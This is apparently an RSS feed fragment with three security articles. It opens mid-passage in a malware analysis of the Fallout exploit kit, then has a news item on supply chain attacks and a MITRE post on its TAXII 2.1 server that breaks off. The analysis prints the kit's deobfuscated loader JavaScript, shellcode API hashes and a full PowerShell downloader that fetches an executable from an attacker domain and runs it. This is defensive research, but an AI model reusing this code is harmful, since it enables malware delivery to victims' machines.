            <span class="kd">var</span> <span class="nx">TJIp1rglYoq</span> <span class="o">=</span> <span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">][</span><span class="dl">'</span><span class="s1">substring</span><span class="dl">'</span><span class="p">](</span><span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">][</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="se">\'</span><span class="dl">'</span><span class="p">));</span>
            <span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">]</span> <span class="o">=</span> <span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">][</span><span class="dl">'</span><span class="s1">replace</span><span class="dl">'</span><span class="p">](</span><span class="nx">TJIp1rglYoq</span><span class="p">,</span><span class="dl">''</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">if</span><span class="p">(</span><span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">][</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">MsgBox</span><span class="dl">'</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">]</span> <span class="o">=</span> <span class="dl">''</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">if</span><span class="p">(</span><span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">][</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">Alert</span><span class="dl">'</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">]</span> <span class="o">=</span> <span class="dl">''</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="nx">WW7QZmX</span> <span class="o">=</span> <span class="nx">l1a2N5kr</span><span class="p">[</span><span class="dl">'</span><span class="s1">join</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="se">\n</span><span class="dl">'</span><span class="p">);</span>
    <span class="kd">var</span> <span class="nx">nbvMHPdb</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">document</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">createElement</span><span class="dl">'</span><span class="p">](</span><span class="dl">"</span><span class="s2">iframe</span><span class="dl">"</span><span class="p">);</span>
    <span class="nx">nbvMHPdb</span><span class="p">[</span><span class="dl">'</span><span class="s1">setAttribute</span><span class="dl">'</span><span class="p">](</span><span class="dl">"</span><span class="s2">id</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">AARa7</span><span class="dl">"</span><span class="p">);</span>
    <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">document</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">getElementsByTagName</span><span class="dl">'</span><span class="p">](</span><span class="dl">"</span><span class="s2">BODY</span><span class="dl">"</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">nbvMHPdb</span><span class="p">);</span>
    <span class="kd">var</span> <span class="nx">ocH5HC2B</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">document</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">getElementById</span><span class="dl">'</span><span class="p">](</span><span class="dl">"</span><span class="s2">AARa7</span><span class="dl">"</span><span class="p">)[</span><span class="dl">'</span><span class="s1">contentWindow</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">document</span><span class="dl">'</span><span class="p">];</span>
    <span class="nx">ocH5HC2B</span><span class="p">[</span><span class="dl">'</span><span class="s1">open</span><span class="dl">'</span><span class="p">]();</span>
    <span class="nx">ocH5HC2B</span><span class="p">[</span><span class="dl">'</span><span class="s1">write</span><span class="dl">'</span><span class="p">](</span><span class="nx">WW7QZmX</span><span class="p">);</span>
    <span class="nx">ocH5HC2B</span><span class="p">[</span><span class="dl">'</span><span class="s1">close</span><span class="dl">'</span><span class="p">]();</span>
<span class="p">}</span>
<span class="nx">dIl15w</span><span class="p">[</span><span class="dl">'</span><span class="s1">open</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">get</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">https://raw.githubusercontent.com/w7374520/CVE-2018-8174_EXP/master/CVE-2018-8174.py</span><span class="dl">'</span><span class="p">);</span>
<span class="nx">dIl15w</span><span class="p">[</span><span class="dl">'</span><span class="s1">send</span><span class="dl">'</span><span class="p">]();</span>
</code></pre></div></div>

<p>This code is exploit by replacing the shellcode part of PoC of CVE-2018-8174 on GitHub. We are finding that four PoCs are being exploited. There may be other things.</p>

<ul>
  <li>w7374520/CVE-2018-8174_EXP/master/CVE-2018-8174.py</li>
  <li>admintony/VulRec/master/CVE-2018-8174/calc.html</li>
  <li>kaisaryousuf/CVE-2018-8174-msf/master/CVE-2018-8174.rb</li>
  <li>lovebair2022/CVE-2018-8174-msf/master/CVE-2018-8174.rb</li>
</ul>

<h2 id="shellcode">Shellcode</h2>
<p><a href="https://www.nao-sec.org/2019/01/in-depth-analysis-of-new-fallout.html">In the previous blog</a> We wrote that Fallout uses RC4 and powershell. Currently, It decrypts with RC4 using multiple keys.</p>

<p><img alt="" src="https://4.bp.blogspot.com/-6UVMjUup6qo/XHn461S2DQI/AAAAAAAAaAc/ihjgvwM48ds78W-1a50a5naMAiw-jtvwQCLcBGAs/s1600/%25E3%2582%25B3%25E3%2583%25A1%25E3%2583%25B3%25E3%2583%2588%2B2019-03-02%2B121824.jpg" /></p>

<p><img alt="" src="https://1.bp.blogspot.com/-DymvnKJrNeE/XHn5O-hzKBI/AAAAAAAAaAs/s8JysGgcRwAk_vvDNVcUIIu8nLHY0LfswCLcBGAs/s1600/%25E3%2582%25B3%25E3%2583%25A1%25E3%2583%25B3%25E3%2583%2588%2B2019-03-02%2B123150.jpg" /></p>

<h3 id="encrypted-data">Encrypted data</h3>
<p>Encrypted data is near the end of the shell code.</p>

<p><img alt="" src="https://4.bp.blogspot.com/-gsfXIhMYevM/XHn8WBk9ovI/AAAAAAAAaBg/10bGFzmcPOwREpu9jFcdDV_QNU_q428QQCLcBGAs/s1600/%25E3%2582%25B3%25E3%2583%25A1%25E3%2583%25B3%25E3%2583%2588%2B2019-03-02%2B124509.jpg" /></p>

<p>The following strings are encrypted.</p>

<ul>
  <li>URL</li>
</ul>

<p><img alt="" src="https://3.bp.blogspot.com/-mGb6y9CcLgY/XHn_tTXITlI/AAAAAAAAaBs/Tx-IZGvfR7MKXeLZoduOknHsG-oG611mACLcBGAs/s1600/%25E3%2582%25B3%25E3%2583%25A1%25E3%2583%25B3%25E3%2583%2588%2B2019-03-02%2B094830.jpg" /></p>

<ul>
  <li>Path</li>
</ul>

<p><img alt="" src="https://1.bp.blogspot.com/-nJQJtvhQ4ts/XHoAJThO_UI/AAAAAAAAaB0/AqdnhErozq4RtSn0IBPxDh26i1VIb3ySwCLcBGAs/s1600/%25E3%2582%25B3%25E3%2583%25A1%25E3%2583%25B3%25E3%2583%2588%2B2019-03-02%2B094918.jpg" /></p>

<ul>
  <li>lpszAgent</li>
</ul>

<p><img alt="" src="https://4.bp.blogspot.com/-SHiC_-K52OE/XHoAYO0KSqI/AAAAAAAAaB4/mIuho6VGEigMXjQD0PYCic7yPSQjP50agCLcBGAs/s400/%25E3%2582%25B3%25E3%2583%25A1%25E3%2583%25B3%25E3%2583%2588%2B2019-03-02%2B095113.jpg" /></p>

<ul>
  <li>HTTP Method</li>
</ul>

<p><img alt="" src="https://1.bp.blogspot.com/-8VHYdHuFVzo/XHoAun-ulAI/AAAAAAAAaCE/dZL11EMf0Js8hKDBVtWrb1TpxiUKVleHgCLcBGAs/s400/%25E3%2582%25B3%25E3%2583%25A1%25E3%2583%25B3%25E3%2583%2588%2B2019-03-02%2B095212.jpg" /></p>

<ul>
  <li>Dll name</li>
</ul>

<p><img alt="" src="https://4.bp.blogspot.com/-d1VACU5EdCg/XHoA0UXjwJI/AAAAAAAAaCI/4nYEy6pr69YYZGCk-PYTL4DwLlXGXPEaACLcBGAs/s400/%25E3%2582%25B3%25E3%2583%25A1%25E3%2583%25B3%25E3%2583%2588%2B2019-03-02%2B095457.jpg" /></p>

<h3 id="execute">Execute</h3>
<p><img alt="" src="https://1.bp.blogspot.com/-J6-pH9sR77Y/XHoD9uuQ2rI/AAAAAAAAaCg/tdiUL-ppen0UgdBMlAw0YJoIAOp5JoJkgCLcBGAs/s400/%25E3%2582%25B3%25E3%2583%25A1%25E3%2583%25B3%25E3%2583%2588%2B2019-03-02%2B131719.jpg" /></p>

<h3 id="api-hash">API hash</h3>
<p>The API called by the shell code has been hashed by the dualaccModFFF1Hash algorithm.</p>

<p><img alt="" src="https://3.bp.blogspot.com/--PgKXNTSaEU/XHoC9ETsXsI/AAAAAAAAaCY/YfQrDoaJySA6qJpeQcsquCv6MRV5XyxwgCLcBGAs/s320/%25E3%2582%25B3%25E3%2583%25A1%25E3%2583%25B3%25E3%2583%2588%2B2019-03-02%2B131317.jpg" /></p>



<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ShellcodeHashSearcher: 0x00000686: dualaccModFFF1Hash:0x191c0443 kernel32.dll!CloseHandle
ShellcodeHashSearcher: 0x00000694: dualaccModFFF1Hash:0x28b90575 kernel32.dll!CreateProcessA
ShellcodeHashSearcher: 0x000006a6: dualaccModFFF1Hash:0x73320951 kernel32.dll!CreateToolhelp32Snapshot
ShellcodeHashSearcher: 0x000006b9: dualaccModFFF1Hash:0x33f50614 kernel32.dll!GetModuleHandleA
ShellcodeHashSearcher: 0x000006ca: dualaccModFFF1Hash:0x1d810497 kernel32.dll!LoadLibraryA
ShellcodeHashSearcher: 0x000006da: dualaccModFFF1Hash:0x2785054d kernel32.dll!Process32First
ShellcodeHashSearcher: 0x000006eb: dualaccModFFF1Hash:0x225904e4 kernel32.dll!Process32Next
ShellcodeHashSearcher: 0x000006fc: dualaccModFFF1Hash:0x1f7004d3 kernel32.dll!VirtualAlloc
ShellcodeHashSearcher: 0x0000070d: dualaccModFFF1Hash:0x1a1e047a kernel32.dll!ExitProcess
ShellcodeHashSearcher: 0x0000071e: dualaccModFFF1Hash:0x158503f3 kernel32.dll!ExitThread
ShellcodeHashSearcher: 0x00000737: dualaccModFFF1Hash:0x08d8028c msvcrt.dll!memset
ShellcodeHashSearcher: 0x00000737: dualaccModFFF1Hash:0x08d8028c ntoskrnl.exe!memset
ShellcodeHashSearcher: 0x00000737: dualaccModFFF1Hash:0x08d8028c ntdll.dll!memset
ShellcodeHashSearcher: 0x00000778: dualaccModFFF1Hash:0x3610065d wininet.dll!HttpOpenRequestA
ShellcodeHashSearcher: 0x00000787: dualaccModFFF1Hash:0x29fb0584 wininet.dll!HttpQueryInfoA
ShellcodeHashSearcher: 0x0000079a: dualaccModFFF1Hash:0x35c70655 wininet.dll!HttpSendRequestA
ShellcodeHashSearcher: 0x000007ab: dualaccModFFF1Hash:0x4b92078c wininet.dll!InternetCloseHandle
ShellcodeHashSearcher: 0x000007bc: dualaccModFFF1Hash:0x36640655 wininet.dll!InternetConnectA
ShellcodeHashSearcher: 0x000007cd: dualaccModFFF1Hash:0x245c051d wininet.dll!InternetOpenA
ShellcodeHashSearcher: 0x000007de: dualaccModFFF1Hash:0x35c00646 wininet.dll!InternetReadFile
ShellcodeHashSearcher: 0x00000685: dualaccModFFF1Hash:0x191c0443 kernel32.dll!CloseHandle
ShellcodeHashSearcher: 0x00000693: dualaccModFFF1Hash:0x28b90575 kernel32.dll!CreateProcessA
ShellcodeHashSearcher: 0x000006a5: dualaccModFFF1Hash:0x73320951 kernel32.dll!CreateToolhelp32Snapshot
ShellcodeHashSearcher: 0x000006b8: dualaccModFFF1Hash:0x33f50614 kernel32.dll!GetModuleHandleA
ShellcodeHashSearcher: 0x000006c9: dualaccModFFF1Hash:0x1d810497 kernel32.dll!LoadLibraryA
ShellcodeHashSearcher: 0x000006d9: dualaccModFFF1Hash:0x2785054d kernel32.dll!Process32First
ShellcodeHashSearcher: 0x000006ea: dualaccModFFF1Hash:0x225904e4 kernel32.dll!Process32Next
ShellcodeHashSearcher: 0x000006fb: dualaccModFFF1Hash:0x1f7004d3 kernel32.dll!VirtualAlloc
ShellcodeHashSearcher: 0x0000070c: dualaccModFFF1Hash:0x1a1e047a kernel32.dll!ExitProcess
ShellcodeHashSearcher: 0x0000071d: dualaccModFFF1Hash:0x158503f3 kernel32.dll!ExitThread
ShellcodeHashSearcher: 0x00000736: dualaccModFFF1Hash:0x08d8028c msvcrt.dll!memset
ShellcodeHashSearcher: 0x00000736: dualaccModFFF1Hash:0x08d8028c ntoskrnl.exe!memset
ShellcodeHashSearcher: 0x00000736: dualaccModFFF1Hash:0x08d8028c ntdll.dll!memset
ShellcodeHashSearcher: 0x00000777: dualaccModFFF1Hash:0x3610065d wininet.dll!HttpOpenRequestA
ShellcodeHashSearcher: 0x00000786: dualaccModFFF1Hash:0x29fb0584 wininet.dll!HttpQueryInfoA
ShellcodeHashSearcher: 0x00000799: dualaccModFFF1Hash:0x35c70655 wininet.dll!HttpSendRequestA
ShellcodeHashSearcher: 0x000007aa: dualaccModFFF1Hash:0x4b92078c wininet.dll!InternetCloseHandle
ShellcodeHashSearcher: 0x000007bb: dualaccModFFF1Hash:0x36640655 wininet.dll!InternetConnectA
ShellcodeHashSearcher: 0x000007cc: dualaccModFFF1Hash:0x245c051d wininet.dll!InternetOpenA
ShellcodeHashSearcher: 0x000007dd: dualaccModFFF1Hash:0x35c00646 wininet.dll!InternetReadFile
</code></pre></div></div>

<p>The final encoded PowerShell script is downloaded, decoded and executed.</p>

<h2 id="powershell">PowerShell</h2>

<pre><code class="language-ps1">Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

[StructLayout(LayoutKind.Sequential)]
public struct lI111
{
    public IntPtr llIll;
    public IntPtr II1ll1I1;
    public uint llllIlI;
    public uint l1l1l;
}

[StructLayout(LayoutKind.Sequential,CharSet=CharSet.Unicode)]
public struct lI1I1l1l
{
    public uint lI1lI1I;
    public string l1l1II1;
    public string llIlI1;
    public string IlIl1l;
    public uint ll1llI11;
    public uint ll1l11I1;
    public uint IlI11lI;
    public uint IIlIll1I;
    public uint IIl1II;
    public uint I11Il;
    public uint IIIIII;
    public uint l1IlIll;
    public short llI11l1;
    public short llll1I11;
    public IntPtr I1llIIlI;
    public IntPtr Il1I11lI;
    public IntPtr llllll;
    public IntPtr lI1l1I1I;
};

public static class I1l11lIl
{
    [DllImport(""kernel32.dll"",SetLastError=true)]
    public static extern bool CreateProcess(string I1l1Il1I,string l1111,IntPtr lllI111,IntPtr I111IIlI,bool lllll,uint III1l1l1,IntPtr l1l1l11l,string lIll1111,ref lI1I1l1l l111l,out lI111 I1111l1);
}
"@;

$lIlI1 = "$env:userprofile\AppData\LocalLow\$(-join((48..57)+(65..90)+(97..122)|Get-Random -Count 8|%{[char]$_})).tmp";
$Il11l = 'https://not-my-guilty.com/04_10_1971/beaveries/aoer.phtml';

$cli = (New-Object Net.WebClient);
$cli.Headers['User-Agent'] = 'pqqyW56Fe8W2G7m3';
$cli.DownloadFile($Il11l, $lIlI1);

$llII11l = New-Object lI1I1l1l;
$llII11l.llI11l1 = 0x0;
$llII11l.lI1lI1I = [System.Runtime.InteropServices.Marshal]::SizeOf($llII11l);
$I1111111 = New-Object lI111;
[I1l11lIl]::CreateProcess($lIlI1, $lIlI1, [IntPtr]::Zero, [IntPtr]::Zero, $false, 0x00000008, [IntPtr]::Zero, "c:", [ref]$llII11l, [ref]$I1111111)|out-null;
</code></pre>

<p>This PowerShell code downloads the malware and calls CreateProcess. At this time, User-Agent is not common.</p>

<p><img alt="" src="https://nao-sec.org/assets/2019-03-07/02.png" /></p>

<h2 id="finally">Finally</h2>
<p>Fallout has also evolved. Analysis has become more difficult than before. You should keep an eye on Fallout in the future.</p>
]]></content:encoded>
<pubDate>2019-03-06T15:00:00+00:00</pubDate>
</item>
<item>
<title>Cyble Research Reveals Near-Daily Surge in Supply Chain Attacks</title>
<link>https://www.cysecurity.news/2024/08/cyble-research-reveals-near-daily-surge.html</link>
<guid>https://www.cysecurity.news/2024/08/cyble-research-reveals-near-daily-surge.html</guid>
<content:encoded><![CDATA[
<p>&nbsp;</p>
<div class="separator" style="clear: both;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhj_ZBIQzOAPBvGALxcLtEBgh3aMfk-heWaV3T_mIMI29LLFFy8JHnS5pB2HLMaeL10rHz92dEjpXJF_7Il41mVxXZgKwEsf_vDAQwGOdGmyfEXTWcWg0SJaZylM7GS2LxWNXCGlPs_8YzHZ3-bk3CajI3uJmWMJ_MoIHgPX2owMuGt1nlQPWjO7_g7LjY/s4576/pexels-pixabay-60504.jpg" style="display: block; padding: 1em 0px; text-align: center;"><img alt="" border="0" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhj_ZBIQzOAPBvGALxcLtEBgh3aMfk-heWaV3T_mIMI29LLFFy8JHnS5pB2HLMaeL10rHz92dEjpXJF_7Il41mVxXZgKwEsf_vDAQwGOdGmyfEXTWcWg0SJaZylM7GS2LxWNXCGlPs_8YzHZ3-bk3CajI3uJmWMJ_MoIHgPX2owMuGt1nlQPWjO7_g7LjY/s600/pexels-pixabay-60504.jpg" width="600" /></a></div><div style="text-align: justify;">The prevalence of software supply chain attacks is on the rise, posing significant threats due to the extensive impact and severity of such incidents, according to threat intelligence researchers at Cyble.</div><div style="text-align: justify;"><br /></div><div style="text-align: justify;">Within a six-month span from February to mid-August, Cyble identified 90 claims of supply chain breaches made by cybercriminals on the dark web. This averages nearly one breach every other day. Supply chain attacks are notably more costly and damaging than other types of cyber breaches, making even a small number of these attacks particularly detrimental.</div><div style="text-align: justify;"><br /></div><div style="text-align: justify;">Cyble’s blog highlights that while infiltrations of an IT supplier’s codebase—similar to the SolarWinds incident in 2020 and Kaseya in 2021—are relatively uncommon, the software supply chain’s various components, including code, dependencies, and applications, remain a continuous source of vulnerabilities. These persistent risks leave all organizations exposed to potential cyberattacks.</div><div style="text-align: justify;"><br /></div><div style="text-align: justify;">Even when supply chain breaches do not compromise codebases, they can still result in the exposure of sensitive data, which attackers can exploit to breach other environments through methods such as phishing, spoofing, and credential theft. The interconnected nature of the physical and digital supply chain means that any manufacturer or supplier involved in downstream distribution could be considered a potential cyber risk, according to the researchers.</div><div style="text-align: justify;"><br /></div><div style="text-align: justify;">In their 2024 analysis, Cyble researchers examined the frequency and characteristics of supply chain attacks and explored defenses that can mitigate these risks.</div><div style="text-align: justify;"><br /></div><div style="text-align: justify;"><b>Increasing Frequency of Supply Chain Attacks</b></div><div style="text-align: justify;"><br /></div><div style="text-align: justify;">Cyble’s dark web monitoring revealed 90 instances of cybercriminals claiming successful supply chain breaches between February and mid-August 2024.</div><div style="text-align: justify;"><br /></div><div style="text-align: justify;">IT service providers were the primary targets, accounting for one-third of these breaches. Technology product companies were also significantly impacted, experiencing 14 breaches. The aerospace and defense, manufacturing, and healthcare sectors followed, each reporting between eight and nine breaches.</div><div style="text-align: justify;"><br /></div><div style="text-align: justify;">Despite the concentration of attacks in certain industries, Cyble’s data shows that 22 out of 25 sectors tracked have experienced supply chain attacks in 2024. The U.S. led in the number of breaches claimed on the dark web, with 31 incidents, followed by the UK with 10, and Germany and Australia with five each. Japan and India each reported four breaches.</div><div style="text-align: justify;"><br /></div><div style="text-align: justify;"><b>Significant Supply Chain Attacks in 2024</b></div><div style="text-align: justify;"><br /></div><div style="text-align: justify;">Cyble’s blog detailed eight notable attacks, ranging from codebase hijacks affecting over 100,000 sites to disruptions of essential services. Examples include:</div><div style="text-align: justify;"><br /></div><div style="text-align: justify;"><ul><li>jQuery Attack: In July, a supply chain attack targeted the JavaScript npm package manager, using trojanized versions of jQuery to exfiltrate sensitive form data from websites. This attack impacted multiple platforms and highlighted the urgent need for developers and website owners to verify package authenticity and monitor code for suspicious modifications.</li><li>Polyfill Attack: In late June, a fake domain impersonated the Polyfill.js library, injecting malware into over 100,000 websites. This malware redirected users to unauthorized sites, underscoring the security risks associated with external code libraries and the importance of vigilant website security.</li><li>Programming Language Breach: The threat actor IntelBroker claimed unauthorized access to a node package manager (npm) and GitHub account related to an undisclosed programming language, including private repositories with privileges to push and clone commits.</li><li>CDK Global Inc. Attack: On June 19, a ransomware attack targeted CDK Global Inc., a provider of software to automotive dealerships, disrupting sales and inventory operations for weeks across North American auto dealers, including major networks like Group1 Automotive Inc. and AutoNation Inc.</li><li>Access to 400+ Companies: IntelBroker also claimed in June to have access to over 400 companies through a compromised third-party contractor, with data access to platforms like Jira, GitHub, and AWS, potentially affecting large organizations such as Lockheed Martin and Samsung.</li></ul></div><div style="text-align: justify;"><b>Mitigating Supply Chain Risks through Zero Trust and Resilience</b></div><div style="text-align: justify;"><br /></div><div style="text-align: justify;">To counter supply chain attacks, Cyble researchers recommend adopting zero trust principles, enhancing cyber resilience, and improving code security. Key defenses include:</div><div style="text-align: justify;"><br /></div><div style="text-align: justify;"><ol><li>Network microsegmentation</li><li>Strong access controls</li><li>Robust user and device identity authentication</li><li>Encrypting data both at rest and in transit</li><li>Ransomware-resistant backups that are “immutable, air-gapped, and isolated”</li><li>Honeypots for early detection of breaches</li><li>Secure configuration of API and cloud service connections</li><li>Monitoring for unusual activity using tools like SIEM and DLP</li><li>Regular audits, vulnerability scanning, and penetration testing are also essential for maintaining these controls.</li></ol></div><div style="text-align: justify;"><br /></div><div style="text-align: justify;"><b>Enhancing Secure Development and Third-Party Risk Management</b></div><div style="text-align: justify;"><br /></div><div style="text-align: justify;">Cyble also emphasizes best practices for code security, including developer audits and partner assessments. The use of threat intelligence services like Cyble’s can further aid in evaluating partner and vendor risks.</div><div style="text-align: justify;"><br /></div><div style="text-align: justify;">Cyble’s third-party risk intelligence module assesses partner security across various areas, such as cyber hygiene, dark web exposure, and network vulnerabilities, providing specific recommendations for improvement. Their AI-powered vulnerability scanning also helps organizations identify and prioritize their own web-facing vulnerabilities.</div><div style="text-align: justify;"><br /></div><div style="text-align: justify;">As security becomes a more critical factor in purchasing decisions, vendors will likely need to improve their security controls and documentation to meet these demands, the report concludes.</div>
]]></content:encoded>
<pubDate>2024-08-24T13:22:39.668-04:00</pubDate>
</item>
<item>
<title>Introducing TAXII 2.1 and a fond farewell to the TAXII 2.0 Server</title>
<link>https://medium.com/mitre-attack/introducing-taxii-2-1-and-a-fond-farewell-to-taxii-2-0-d9fca6ce4c58?source=rss----6da19bd08fba---4</link>
<guid>https://medium.com/mitre-attack/introducing-taxii-2-1-and-a-fond-farewell-to-taxii-2-0-d9fca6ce4c58?source=rss----6da19bd08fba---4</guid>
<content:encoded><![CDATA[
<figure><img alt="" src="https://cdn-images-1.medium.com/max/1024/1*0GQBfYbb0frVtyhYLi3yiA.png" /></figure><p>As mentioned in our <a href="/mitre-attack/attack-2024-roadmap-8dfc46d1ad1b">2024 Roadmap</a> and the <a href="/mitre-attack/attack-v15-26685f300acc">v15 release blog</a>, we’re excited to introduce our new TAXII server and the latest addition to the ATT&amp;CK Workbench software suite: the <a href="https://attack-taxii.mitre.org/">MITRE ATT&amp;CK Workbench TAXII 2.1 Server</a>. We’ve open-sourced the TAXII 2.1 code on <a href="https://github.com/mitre-attack/attack-workbench-taxii-server">GitHub</a>, allowing you to set up your own servers within your organization <em>and </em>contribute to its improvement.</p><p>While you’re diving into the new 2.1 server, don’t forget: our TAXII 2.0 server is retiring on <strong>December 18.</strong></p><p><strong>To continue receiving updated ATT&amp;CK data, you’ll need to migrate from cti-taxii.mitre.org to attack-taxii.mitre.org. However, this migration may involve more than just a URL change. Given the transition from STIX 2.0 to STIX 2.1, the complexity of your migration will depend on how deeply your applications are integrated with STIX 2.0. We recommend assessing the impact on your systems and planning your migration accordingly.</strong></p><p><strong>Getting Started with TAXII 2.1</strong></p><p>Ready to explore the MITRE ATT&amp;CK Workbench TAXII 2.1 server?</p><ul><li>Visit our <a href="https://github.com/mitre-attack/attack-workbench-taxii-server">GitHub repository</a> for the source code and detailed <a href="https://github.com/mitre-attack/attack-workbench-taxii-server/blob/main/docs/USAGE.md">usage documentation</a>.</li><li>Leverage the <a href="https://github.com/mitre-attack/attack-workbench-deployment">ATT&amp;CK Workbench Deployment</a> repository with <a href="https://github.com/mitre-attack/attack-workbench-deployment/blob/main/compose.yaml">Docker Compose templates</a> to simplify setting up Workbench services and the TAXII 2.1 module (so you can pull the Docker images from GitHub and get started without building from source!).</li><li>Skip the source code and pull the TAXII 2.1 Docker image directly from the <a href="https://github.com/mitre-attack/attack-workbench-taxii-server/pkgs/container/attack-workbench-taxii-server">GitHub Container Registry</a>.</li><li>Access the server <a href="https://attack-taxii.mitre.org/api-docs/">Swagger interface</a> and <a href="https://www.usebruno.com/">Bruno API Client</a> definitions (Bruno, similar to Postman, provides an easy way to interact with REST APIs). You can find our <a href="https://github.com/mitre-attack/attack-workbench-taxii-server/tree/main/bruno">Bruno files here</a>.</li><li>Familiarize yourself with the <a href="https://docs.oasis-open.org/cti/taxii/v2.1/os/taxii-v2.1-os.html#_Toc31107514">OASIS TAXII 2.1 specification</a> to enhance your integration prowess.</li><li>Experience issues? Submit <a href="https://github.com/mitre-attack/attack-workbench-taxii-server/issues/new/choose">specific requests or encounter issues</a> on GitHub.</li></ul><p><strong>Why TAXII 2.1?</strong></p><p>We know the ATT&amp;CK community has relied on our public TAXII 2.0 server, but it had issues like frequent outages. The TAXII 2.1 server addresses these problems with a more reliable and smooth experience. It’s built for scalability and stress-tested with real-world benchmarks from TAXII 2.0, ensuring you’re less likely to face major outages. Additionally, the new server introduces pagination, which was missing in TAXII 2.0. This means you can fetch smaller chunks of data instead of the entire ~20 MB STIX collection, speeding up the process and reducing data transfer costs.</p><p>A critical update to note is that our TAXII 2.1 server will exclusively host STIX 2.1 content moving forward. This change is part of our long-term strategy to shift away from STIX 2.0, aligning with the latest standards.</p><p>The new TAXII 2.1 server is also more powerful and capable than the previous version. We designed it to smoothly integrate with Workbench, making CTI management as seamless as possible. If you’re already using the ATT&amp;CK Workbench in your CTI workflows, you can easily edit and maintain CTI data without needing additional tools. The TAXII 2.1 server integrates with the ATT&amp;CK Workbench software suite, and can automatically synch with the Workbench REST API (the Workbench “back end”).</p><p>Workbench users can add objects, STIX collections, and bundles, and the TAXII 2.1 server will automatically make them available via its REST API. You don’t need to change your editor workflows — just bring the TAXII 2.1 server online in your Workbench container stack, and it will sync every 30 minutes by default (administrators can adjust this if needed). TAXII 2.1 is also optional, and you can continue using Workbench as usual without it.</p><p>Of note, the TAXII 2.1 specification outlines two “sharing models” for TAXII server implementations:</p><ul><li>The <strong>Collection model</strong>, where the TAXII server allows producers to host a set of CTI data that can be requested by consumers: TAXII Clients and Servers exchange information in a <a href="https://en.wikipedia.org/wiki/Request%E2%80%93response">request-response model</a>.</li><li>The <strong>Channel model</strong>, where the TAXII server uses the <a href="https://en.wikipedia.org/wiki/Publish%E2%80%93subscribe_pattern">publish-subscribe pattern</a> to allow producers to push data to many consumers and consumers to receive data from many producers.</li></ul><p>Given that Channels are still loosely defined in the TAXII specification, we decided to only implement the Collections model outlined in the TAXII 2.1 specification. However, we are open to adding support for a pub-sub model in future releases.</p><p><strong>A Brief Guide to Accessing Threat Intelligence Data</strong></p><p>With the new TAXII 2.1 server, you can still access your cyber threat intel in STIX format through the publicly accessible REST API, just like its <a href="http://cti-taxii.mitre.org/">predecessor</a> (cti-taxii.mitre.org) that’s been around for <a href="https://medium.com/mitre-attack/att-ck-content-available-in-stix-2-0-via-public-taxii-2-0-server-317e5c41e214">over 6 years</a>. Even though this server has some sophisticated functionality, querying it is actually pretty simple. This following guide will show you the basics and help you easily get the threat intelligence data you need.</p><p>With TAXII 2.1 running on a RESTful API model and using standard HTTP requests, you can connect to the server using any HTTP client you like. This includes popular tools like curl, wget, httpie, or Postman. This flexibility allows you to seamlessly integrate TAXII 2.1 queries into your existing workflows and tools.</p><p>Let’s dive into how to structure these requests and interpret the responses.</p><p>Importantly, all TAXII 2.1 requests require a special Accept header:</p><pre>GET /taxii2/ HTTP/1.1 Accept: application/taxii+json;version=2.1 Host: attack-taxii.mitre.org</pre><p>Here is an example of setting the Accept header using the curl tool:</p><pre>curl --request GET \<br />  --url https://attack-taxii.mitre.org/taxii2/ \<br />  --header ‘Accept: application/taxii+json;version=2.1’</pre><p>The request above sends a request to the TAXII server’s <a href="https://docs.oasis-open.org/cti/taxii/v2.1/os/taxii-v2.1-os.html#_Toc31107497">Discovery endpoint</a>, which returns a list of available API roots that the TAXII server offers. Each API Root is the “root” URL of that particular instance of the TAXII API. Our TAXII server only hosts one API Root, which we can see clearly from the response body:</p><pre>{ <br />  &quot;title&quot;: &quot;MITRE ATT&amp;CK TAXII 2.1&quot;, <br />  &quot;description&quot;: &quot;This API Root contains TAXII 2.1 REST API endpoints that serve MITRE ATT&amp;CK STIX 2.1 data&quot;, <br />  &quot;default&quot;: &quot;api/v21&quot;, <br />  &quot;api_roots&quot;: [ <br />    &quot;api/v21&quot; <br />  ] <br />} </pre><p>Great! Now that we have the API 